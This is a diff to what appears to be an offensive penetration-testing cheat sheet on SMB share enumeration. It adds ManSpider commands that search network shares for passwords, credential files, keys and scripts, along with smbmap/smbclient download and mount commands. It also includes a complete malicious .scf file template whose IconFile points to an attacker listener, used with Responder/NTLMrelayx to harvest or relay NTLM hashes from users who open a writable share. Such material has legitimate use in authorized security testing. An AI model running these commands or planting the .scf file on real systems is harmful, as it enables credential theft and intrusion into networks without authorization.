@@ -46,28 +46,47 @@ enum4linux -P -o <target>
 enum4linux -a <target>
 ```
 
-### Open shares \(anonymous SMB, NFS, FTP, etc\)
+### Open shares \(SMB, NFS, FTP, etc\)
 
-SMB open shares
+SMB readable shares
 
 ```bash
+# ManSpider
+git clone https://github.com/blacklanternsecurity/MANSPIDER && cd MANSPIDER && pipenv --python 3 shell
+pip install -r requirements.txt
+./manspider.py <target> -d <domain> -u <user> -p <pass> -f passw user admin account network login logon cred 
+./manspider.py <target> -d <domain> -u <user> -p <pass> -c password -e xlsx
+./manspider.py <target> -d <domain> -u <user> -p <pass> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config 
+
+# smbmap
 smbmap -H IP -r DOSSIER
 smbmap -H IP --download DOSSIER
+smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
 
 # SMB V1
 smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
 mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]
-```
 
-SMB restricted shares
-
-```bash
-smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
-smbget -rR smb://<target>/<share>/ -U <user>
+smbget -rR smb://<target>/<share>/ -U <user
 smbclient \\\\<target>\\c$ -U <user>
 smbclient -L //<target> -U '<domain>\<user>`
-#upload .ico .scf => Responder/NTLMrelayx
+
 ```
+
+SMB writable shares
+
+- upload @<scf_name>.scf file => Responder/NTLMrelayx
+
+> Note: add a @ at first letter of the filename will place the .scf file on the top of the shared folder
+
+```bash
+[Shell]
+Command=2
+IconFile=\\<listener_ip>\share\<ico_name>.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
 
 NFS 
 
